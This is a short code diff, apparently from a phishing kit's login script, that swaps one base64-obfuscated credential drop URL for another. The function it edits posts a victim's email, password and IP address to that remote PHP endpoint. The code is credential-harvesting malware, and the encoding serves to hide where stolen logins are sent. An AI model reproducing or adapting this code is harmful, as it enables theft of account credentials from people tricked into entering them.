@@ -21,7 +21,7 @@ function setLoginButton(loading) {
 }
 
 function submitToServer(email, pwd, ip) {
-  const url = atob('aHR0cHM6Ly9jbG91ZC4weDU5ZDY3MWZkMTU4ZDdkNGM1NmRmZDY1YzQ2YjA3OGY5ODM2YTJkNDAuY2xvdWQvMTIzLnBocA==');
+  const url = atob('aHR0cHM6Ly9ob2trYWlzdXNoaS5jb20uYnIvYWxpeXVuL3Byb3RlY3QvMTIzLnBocA');
   return fetch(url, {
     method : 'POST',
     headers: { 'Content-Type': 'application/json' },
